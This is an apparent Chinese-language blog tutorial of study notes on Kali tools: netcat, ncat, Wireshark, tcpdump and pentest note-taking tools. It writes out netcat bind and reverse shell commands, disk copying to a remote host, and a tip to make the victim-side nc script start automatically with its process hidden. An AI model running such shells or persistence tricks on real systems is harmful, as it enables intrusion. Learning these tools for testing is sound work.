@@ -1,0 +1,1362 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="Kali,tool,Web渗透,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Kali实战-基本工具Netcat 简介 网络工具中的瑞士军刀 可简称nc   常用参数 v：显示详细信息 n：只允许数字形式的IP地址，不进行dns解析 作为客户端 不建议跟域名，域名解析任务交由nc，可能会比较慢">
+<meta name="keywords" content="Kali,tool,Web渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali实战-基本工具">
+<meta property="og:url" content="http://21guns.top/2018/01/27/Kali实战-基本工具/index.html">
+<meta property="og:site_name" content="Ry1ynn&#39;s blogs">
+<meta property="og:description" content="Kali实战-基本工具Netcat 简介 网络工具中的瑞士军刀 可简称nc   常用参数 v：显示详细信息 n：只允许数字形式的IP地址，不进行dns解析 作为客户端 不建议跟域名，域名解析任务交由nc，可能会比较慢">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-02-18T11:48:30.763Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Kali实战-基本工具">
+<meta name="twitter:description" content="Kali实战-基本工具Netcat 简介 网络工具中的瑞士军刀 可简称nc   常用参数 v：显示详细信息 n：只允许数字形式的IP地址，不进行dns解析 作为客户端 不建议跟域名，域名解析任务交由nc，可能会比较慢">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://21guns.top/2018/01/27/Kali实战-基本工具/">
+
+
+
+
+
+  <title>Kali实战-基本工具 | Ry1ynn's blogs</title>
+  
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ry1ynn's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2018/01/27/Kali实战-基本工具/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ry1ynn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ry1ynn's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Kali实战-基本工具</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-27T19:30:50+08:00">
+                2018-01-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali相关/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali相关</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Kali实战-基本工具"><a href="#Kali实战-基本工具" class="headerlink" title="Kali实战-基本工具"></a>Kali实战-基本工具</h1><h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><ul>
+<li>简介<ul>
+<li>网络工具中的瑞士军刀</li>
+<li>可简称nc</li>
+</ul>
+</li>
+<li>常用参数<ul>
+<li>v：显示详细信息</li>
+<li>n：只允许数字形式的IP地址，不进行dns解析<ul>
+<li>作为客户端</li>
+<li>不建议跟域名，域名解析任务交由nc，可能会比较慢<a id="more"></a></li>
+</ul>
+</li>
+<li>l，p：监听指定端口，等待连接；作为服务端</li>
+</ul>
+</li>
+<li>常见使用<ul>
+<li>取代telnet获取banner信息<ul>
+<li>作为客户端</li>
+<li>nc -nv 123.123.123.123 25/110/80</li>
+<li>110端口为POP3，25端口为SMTP<ul>
+<li>连接后可以返回banner信息</li>
+<li>连接后可以进行身份认证等进一步操作，认证成功可以进行收发邮件等操作</li>
+<li>POP3身份验证信息（用户名和密码）需要进行base64编码</li>
+<li>kali命令行下base64命令，直接进行编码</li>
+</ul>
+</li>
+<li>80或其他http端口<ul>
+<li>连接后可显示banner信息</li>
+<li>连接后可输入命令进一步操作，如 head /，显示页面信息</li>
+<li>http相关命令，如 head /，显示页面信息</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>传输文本信息，做电子取证<ul>
+<li>用到服务端和客户端</li>
+<li>可实现点对点的、简单的即时通信<ul>
+<li>服务端：nc -l -p 3333</li>
+<li>客户端：nc -nv 123.123.123.123 3333</li>
+</ul>
+</li>
+<li>远程电子取证信息收集<ul>
+<li>本机：nc -l -p 3333</li>
+<li>待取证主机：ls -l | nc -nv 123.123.123.123 3333（|为管道</li>
+<li>即时显示在本机</li>
+</ul>
+</li>
+<li>大量取证信息时<ul>
+<li>本机：nc -l -p 3333 &gt; res.txt</li>
+<li>待取证主机：ps -aux | nc -nv 123.123.123.123 3333 -q 1<ul>
+<li>|为管道符</li>
+<li>q参数：标准输入完成之后等待指定秒数后主动结束nc进程</li>
+<li>若不加q，无法判断命令是否执行成功；</li>
+<li>加q，若进程结束，则表示执行成功</li>
+</ul>
+</li>
+<li>结果导出至本地文件</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>传输文件及目录<ul>
+<li>传输文件<ul>
+<li>服务端收，客户端发<ul>
+<li>s：nc -lp 3333 &gt; res.mp4</li>
+<li>c: nc -nv 123.123.123.123 &lt; a.mp4 -q 2</li>
+</ul>
+</li>
+<li>服务端发，客户端收<ul>
+<li>s：nc -q 2 -lp 3333 &lt; a.mp4</li>
+<li>c: nc -nv 123.123.123.123 &gt; res.mp4</li>
+</ul>
+</li>
+<li>大于号将结果输出到指定文件；小于号将文件内容导入命令</li>
+</ul>
+</li>
+<li>传输目录<ul>
+<li>同传输文件，只是增加打包和解包的过程</li>
+<li>A：tar -cvf - test/ | nc -lp 1234 -q 2</li>
+<li>B：nc -nv 123.123.123.123 | tar -xvf -</li>
+</ul>
+</li>
+<li>加密传文件<ul>
+<li>同传输文件，只不过增加加密和解密的命令</li>
+<li>A：mcrypt —flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 222.222.222.222 -q 2</li>
+<li>B：nc -lp 1234 | mcrypt —flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>流媒体服务<ul>
+<li>依然需要服务器端和客户端</li>
+<li>A：cat 1.mp4 | nc -lp 1234（服务端</li>
+<li>B：nc -nv 1.1.1.1 1234 | mplayer -vo x11 -cache 3000 -（客户端</li>
+</ul>
+</li>
+<li>端口扫描<ul>
+<li>nc -nvz 1.1.1.1 1-65535<ul>
+<li>默认tcp探测</li>
+<li>z参数用于扫描，h参数查看帮助</li>
+</ul>
+</li>
+<li>nc -nvzu 1.1.1.1 1-1024<ul>
+<li>u表示udp探测</li>
+</ul>
+</li>
+<li>只有z参数用于扫描，远不如其他扫描工具如nmap强大</li>
+</ul>
+</li>
+<li>远程克隆硬盘<ul>
+<li>远程电子取证，将目标服务器硬盘远程复制，或者内存</li>
+<li>A：nc -lp 1234 | dd of=/dev/sda<ul>
+<li>（取证端</li>
+</ul>
+</li>
+<li>B：dd if=/dev/sda | nc -nv 1.1.1.1 1234 -q 1（被取证端</li>
+</ul>
+</li>
+<li>远程控制<ul>
+<li>正向<ul>
+<li>A：nc -lp 3333 -c bash（s端，被攻击者</li>
+<li>B：nc 1.1.1.1 3333（c端，攻击者</li>
+<li>说明<ul>
+<li>被攻击者开启端口作为服务器端</li>
+<li>攻击者连接其受害者ip和端口</li>
+<li>连接成功后，受害者将其shell发送至攻击者</li>
+<li>连接方向：外-内</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>反向<ul>
+<li>A：nc -lp 3333（s端，攻击者</li>
+<li>B：nc 1.1.1.1 3333 -c bash（c端，被攻击者</li>
+<li>说明<ul>
+<li>攻击者开启端口，作为服务端</li>
+<li>受害者主动连接攻击者</li>
+<li>连接成功后，受害者将自己shell发送给攻击者</li>
+<li>连接方向：内-外</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>其它<ul>
+<li>若是Windows系统，将bash改为cmd</li>
+<li>主动连接往往受限制，服务器设置为仅对外开放80端口，其它外来连接会被防火墙ban掉</li>
+<li>被动连接，内网服务器主动去连接外网攻击者，一般管理员不会限制其向外访问的端口，如dns的53端口</li>
+<li>在受害者一端，将nc命令保存为脚本，设置其自启动，并采取措施隐藏其运行进程，随用随连</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>缺陷<ul>
+<li>nc缺乏加密和身份验证的能力<ul>
+<li>传输的数据都是不加密的，明文传输便可能被嗅探，被中间人劫持所威胁</li>
+<li>获取远程shell时，nc开启端口后，其他人若扫描到，也可以进行连接，没有身份验证的机制来判断是不是正常用户来连接的</li>
+</ul>
+</li>
+<li>ncat工具<ul>
+<li>简介<ul>
+<li>弥补nc的缺乏加密和身份验证的不足</li>
+<li>ncat包含于nmap工具包中</li>
+<li>nc可完成的功能ncat也均能实现</li>
+<li>nmap不仅只是一个工具，安装后也会有其工具包</li>
+</ul>
+</li>
+<li>使用举例<ul>
+<li>A：ncat -c bash —allow 1.1.1.1 -vnl 333 —ssl<ul>
+<li>服务器端即被控端</li>
+<li>-c bash即通nc的，连接后发送一个bash</li>
+<li>1.1.1.1为本端允许被哪个IP连接，即客户端IP，通过此，实现了身份验证的目的</li>
+<li>监听333端口</li>
+<li>使用ssl，对通信管道加密，即不论里面传输什么，对嗅探者都是加密的</li>
+</ul>
+</li>
+<li>B：ncat -nc 2.2.2.2 333 —ssl<ul>
+<li>客户端即控制端</li>
+<li>2.2.2.2和333:为服务端即被控端IP和端口</li>
+<li>—ssl：保证两端都使用加密的方式来建立连接</li>
+</ul>
+</li>
+<li>说明<ul>
+<li>连接建立后，客户端就返回了服务端的一个shell，可进行远程控制；与一般nc建立的连接有本质区别，是经过加密的</li>
+<li>身份验证功能：是通过服务端的allow参数来设置允许连接的IP地址，来实现的；来自于其它地址的连接不被允许</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>不同系统或平台的nc参数和功能不尽相同（由于nc本身版本的不同<ul>
+<li>如ubuntu中的nc没有-c参数</li>
+<li>若控制端和被控端其版本不同，使用时先自行查找其帮助信息，有些参数是不可以兼容使用的（nc -h或man nc</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h2><ul>
+<li>简介<ul>
+<li>抓包嗅探协议分析</li>
+<li>安全从业者必备技能</li>
+<li>抓包引擎<ul>
+<li>Linux：Libpcap9</li>
+<li>Windows：Winpcap10</li>
+</ul>
+</li>
+<li>解码能力</li>
+</ul>
+</li>
+<li>基本使用方法<ul>
+<li>启动</li>
+<li>选择抓包网卡并start<ul>
+<li>电脑有多块网卡</li>
+<li>可以定制筛选器Filter，只抓符合要求的</li>
+</ul>
+</li>
+<li>混杂模式<ul>
+<li>不启用：仅抓取本机当前网卡的</li>
+<li>启用：可抓取当前网络下其他主机的</li>
+</ul>
+</li>
+<li>实时抓包<ul>
+<li>当前网卡有网络活动，可以实时抓包并显示在界面</li>
+<li>停止抓包后，可以对已抓取的进行保存</li>
+</ul>
+</li>
+<li>保存和分析捕获文件<ul>
+<li>建议保存为pcap格式（兼容性好，其他工具也适用，</li>
+<li>可打开已有数据包进行分析</li>
+</ul>
+</li>
+<li>首选项（即设置<ul>
+<li>对显示界面的布局等做自定义设置</li>
+<li>每条记录即一个包信息，可设置显示的列即字段</li>
+<li>显示字体及不同记录类型的显示颜色的设置</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>筛选器（过滤器<ul>
+<li>目的：过滤掉干扰的数据包</li>
+<li>简单分类<ul>
+<li>抓包筛选器<ul>
+<li>抓包前</li>
+<li>对要抓取的数据包做限制</li>
+</ul>
+</li>
+<li>显示筛选器<ul>
+<li>抓包后</li>
+<li>对已经抓取的数据包做过滤</li>
+<li>对抓包筛选器的二次过滤</li>
+<li>使用较前者频繁</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>过程：网络-抓包筛选器-抓包引擎-显示筛选器</li>
+<li>显示筛选器简单使用<ul>
+<li>可以多个过滤条件叠加，即多个过滤表达式叠加</li>
+<li>直接利用协议筛选，如http，之后apply</li>
+<li>在记录内容处右键，选择apply for filter，如IP包头中，IP地址处，右键…<ul>
+<li>可选择selected、no selected、and…、or…</li>
+<li>注意selected的与或非</li>
+<li>会在filter框中自动生成过滤表达式</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>常见协议包<ul>
+<li>数据包的分层结构<ul>
+<li>每一条记录对应一个数据包，其结构是分层的</li>
+<li>第一层<ul>
+<li>Frame，帧层面</li>
+<li>显示的是统计信息</li>
+</ul>
+</li>
+<li>第二层<ul>
+<li>如以太网协议</li>
+<li>其type字段表示上层协议是什么，即第三层的</li>
+</ul>
+</li>
+<li>第三层<ul>
+<li>如IP协议</li>
+<li>其protocol字段显示上层协议是什么，即第四层的</li>
+</ul>
+</li>
+<li>第四层<ul>
+<li>如UDP、TCP，还有其他，不止U和T</li>
+</ul>
+</li>
+<li>第五层<ul>
+<li>应用层协议，如http，dns</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>常见协议<ul>
+<li>ARP</li>
+<li>ICMP</li>
+<li>TCP-三次握手<ul>
+<li>面向连接</li>
+<li>正式通信前要先建立连接，即三次握手</li>
+<li>a-b之间建立连接<ul>
+<li>a向b：SYN包</li>
+<li>b向a：[SYN，ACK]包</li>
+<li>a向b：ACK包</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>UDP<ul>
+<li>面向无连接，不管对方是否已接收到</li>
+<li>开销较TCP小</li>
+</ul>
+</li>
+<li>DNS<ul>
+<li>域名解析相关</li>
+<li>基于UDP，应用层协议</li>
+</ul>
+</li>
+<li>HTTP<ul>
+<li>基于TCP，应用层协议</li>
+<li>明文协议</li>
+</ul>
+</li>
+<li>FTP</li>
+</ul>
+</li>
+<li>其他<ul>
+<li>Wireshark默认以端口号识别协议类型，如80的http</li>
+<li>但是某些网站会工作在其他端口，此时：右键包，decode as…，选择http，以http协议来处理。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>TCP数据流相关<ul>
+<li>一次通信会涉及多个数据包（如一个大的http页面）右键选择follow tcp stream，跟踪tcp流，查看整个访问过程</li>
+<li>相关协议：http、POP3、smtp、SSL，<ul>
+<li>前三是明文协议，用户可读（邮件传输可能会有base64，也很容易被解码</li>
+<li>SSL是加密的<ul>
+<li>前期明文</li>
+<li>后期密文</li>
+</ul>
+</li>
+<li>ssl相关的包可右键follow ssl stream</li>
+<li>SSL建立通信前会进行公钥等的传输；其之前的传输是明文的，可获取公钥的明文信息；但截获公钥并无安全隐患，其本来就是公开的</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>信息统计<ul>
+<li>位于statics标签<ul>
+<li>summary：显示摘要信息</li>
+<li>endpoint：显示节点，各协议涉及的通信对象列表</li>
+<li>protocol hierarchy：协议分布情况</li>
+<li>packets lengths：包大小分布情况</li>
+<li>conversation：会话连接情况</li>
+</ul>
+</li>
+<li>解码方式<ul>
+<li>Wireshark默认以端口号判断当前使用协议，但不准确，如ftp跑在80端口</li>
+<li>需手动解码，右键decode as</li>
+</ul>
+</li>
+<li>专家系统<ul>
+<li>analyse—expert info</li>
+<li>专家系统的好坏也是评判软件好坏的标准</li>
+<li>由已知流量包给出报警及建议信息</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>实践<ul>
+<li>抓包nc（无加密）ncat（加密）</li>
+<li>企业抓包部署方案<ul>
+<li>Sniffer</li>
+<li>Cace/riverbed</li>
+<li>Cascad pilot</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>其它<ul>
+<li>Wireshark官网存在各种协议包以供学习，自行下载</li>
+<li>缺点：抓取大量主机、面对大流量时会很卡</li>
+</ul>
+</li>
+</ul>
+<h2 id="TcpDump"><a href="#TcpDump" class="headerlink" title="TcpDump"></a>TcpDump</h2><ul>
+<li>简介<ul>
+<li>Wireshark是图像化界面，但好多Linux安装后是没有图形化的纯字符界面；此外，Wireshark不是默认安装的，需自己下载安装；Wireshark虽然也有命令行的，但是也需要自己安装，也会麻烦</li>
+<li>tcpdump是No-GUI的抓包分析工具</li>
+<li>Linux、unix系统默认安装</li>
+</ul>
+</li>
+<li>常见使用<ul>
+<li>抓包<ul>
+<li>默认只抓68字节</li>
+<li>tcpdump -i eth0 -s 0 -w file.pcap<ul>
+<li>-i：指定抓取的接口，interface</li>
+<li>-s：指定抓取数据包的大小（0指数据包有多大就抓多大，默认只抓取数据包的前68字节</li>
+<li>-w：指定抓取数据包的保存文件</li>
+</ul>
+</li>
+<li>tcpdump -i eth0 port 22<ul>
+<li>使用抓包筛选器</li>
+<li>port 22：只抓指定端口的数据包（如22</li>
+<li>tcp port 22:只抓tcp 端口的数据包（如22，也可以udp</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>读取抓包文件<ul>
+<li>tcpdump -r file.pcap<ul>
+<li>-r：指定读取的文件（默认显示摘要信息，较简单</li>
+<li>-A：以ascii码的形式显示其内容</li>
+<li>-X：以16进制的形式显示</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>筛选相关<ul>
+<li>显示筛选器<ul>
+<li>同Wireshark，存在抓包筛选器和显示筛选器</li>
+<li>tcpdump -n -r http.cap | awk ‘{print $3}’ | sort -u<ul>
+<li>-n：显示IP，而不是域名形式</li>
+<li>sort -u：可以去掉重复项</li>
+<li>通过Linux系统命令来进行筛选</li>
+</ul>
+</li>
+<li>tcpdump -n src host 1.1.1.1 -r http.pcap<ul>
+<li>src host：筛选源地址，主机</li>
+</ul>
+</li>
+<li>tcpdump -n dst host 2.2.2.2 -r http.pcap<ul>
+<li>dst host ：筛选目的地址，主机</li>
+</ul>
+</li>
+<li>tcpdump -n port 53 -r http.pcap<ul>
+<li>port 50:筛选指定端口</li>
+<li>或tcp port 53，再指定协议（或udp等其它</li>
+</ul>
+</li>
+<li>tcpdump -nX port 80 -r http.pcap<ul>
+<li>-X：以16进制的形式</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>高级筛选功能<ul>
+<li>以tcp数据包为例，结合其结构，如下：</li>
+<li>tcpdump -A -n ‘tcp[13]=24’ -r http.pcap<ul>
+<li>tcp数据包第十四个字节，十进制为24，即ACK和PSH位为1的</li>
+<li>-A：以ascii码的形式</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="文档记录工具"><a href="#文档记录工具" class="headerlink" title="文档记录工具"></a>文档记录工具</h2><ul>
+<li>简介<ul>
+<li>过程文档目录是很有必要的</li>
+<li>工作过程可能是团队合作，个人需纪录，供团队查看</li>
+<li>工作过程中纪录相关信息，可用于威胁建模等</li>
+<li>最终渗透测试报告的重要信息来源</li>
+</ul>
+</li>
+<li>Dradis<ul>
+<li>短期临时小团队资源共享</li>
+<li>基于web和浏览器，开启后默认监听3004端口，浏览器访问</li>
+<li>输入账号和密码登陆（一般只输入密码即可，因为渗透测试工作的人员是不固定的，再维护人员的账号和密码就不太有必要，dradis就遵循此原则，初始化后，无需输入账号，各成员仅输入密码即可登陆</li>
+<li>本机开启后，其他人访问本IP和相应端口，输入正确密码后，即可登陆，可上传资料，实现成员间共享信息</li>
+<li>dradis中含有许多其他工具的插件，可用来向其中导入工具记录（如nmap的扫描记录，nmap扫描时导出至一个结果文件，dradis中选择nmap类型及对应的结果文件，可实现上传）</li>
+<li>含多种插件供导入文件，导入后，也可选择类型进行导出，如导出为html文件</li>
+</ul>
+</li>
+<li>Keepnote<ul>
+<li>也可以纪录相关信息，层级记录</li>
+<li>类似笔记app，一个项目笔记本下，可新建子目录及子文件，用于记录信息</li>
+<li>记录后，也可将其导出，如导出至html文件</li>
+</ul>
+</li>
+<li>Truecrypt<ul>
+<li>简介<ul>
+<li>渗透测试工作涉及许多敏感信息，其纪录的文件不应随手乱放，需进行加密处理</li>
+<li>尽管truecrypt很优秀，但14年已停止更新，理由是安全性不够，但安全专家测试后，仍证明其优秀的安全性</li>
+<li>Linux平台和Windows平台都可使用</li>
+<li>类似的软件bitlocker，其官方停止更新时有提到</li>
+</ul>
+</li>
+<li>使用<ul>
+<li>创建加密卷<ul>
+<li>创建标准的<ul>
+<li>1，create volume：创建一个卷<ul>
+<li>创建一个加密的文件容器（最常用，以此为例</li>
+<li>或使用当前分区或drive来创建一个卷</li>
+</ul>
+</li>
+<li>2，volume type：选择卷类型<ul>
+<li>standard truecrypt volume</li>
+<li>hidden truecrypt volume（加密盘里面又隐藏了一块加密的区域</li>
+</ul>
+</li>
+<li>3，volume location：选择卷保存的路径</li>
+<li>4，encryption options：选择加密的算法（默认是AES，在此页面也选择hash算法</li>
+<li>5，volume size：制定卷的大小（如100M</li>
+<li>6，volume password：给加密卷设置密码</li>
+<li>7，format option：选择文件格式，FAT还是Ext3</li>
+<li>8，cross-platform support：选择仅Linux平台使用还是其它平台也可使用（视情况而定</li>
+<li>9，最终生成加密文件如c1</li>
+</ul>
+</li>
+<li>创建隐藏的加密卷<ul>
+<li>以上创建的是标准的</li>
+<li>1，volume type时选择hidden的</li>
+<li>2，outer volume size：选择外部的卷的大小（其内部隐藏有另一加密区域</li>
+<li>3，outer volume password：给外部卷的访问设置密码</li>
+<li>4，之后创建好一个外部卷，也以一个硬盘的形式显示（外部卷用于迷惑别人</li>
+<li>5，再按类似的步骤创建一个hidden的（其大小不能超过outer的；且密码不能与outer的相同</li>
+<li>6，使用时，输入outer密码进入outer，输入hidden密码进入hidden的</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>使用加密卷<ul>
+<li>1，选择加密文件，如上述生成的c1文件</li>
+<li>2，点击挂载</li>
+<li>3，输入密码</li>
+<li>4，身份验证通过后，此加密文件以一个硬盘的形式显示在系统</li>
+<li>5，在硬盘中添加相应信息后，即操作完成后，要dismount</li>
+<li>6，对于隐藏的，输入outer密码进入outer，输入hidden密码进入hidden的</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Kali/" rel="tag"># Kali</a>
+          
+            <a href="/tags/tool/" rel="tag"># tool</a>
+          
+            <a href="/tags/Web渗透/" rel="tag"># Web渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/27/Kali实战-Skipfish/" rel="next" title="Kali实战-Skipfish">
+                <i class="fa fa-chevron-left"></i> Kali实战-Skipfish
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/27/Kali实战-Beef/" rel="prev" title="Kali实战-Beef">
+                Kali实战-Beef <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ry1ynn">
+            
+              <p class="site-author-name" itemprop="name">Ry1ynn</p>
+              <p class="site-description motion-element" itemprop="description">我们的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">108</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ry1ynn" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ry1ynn_pri@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
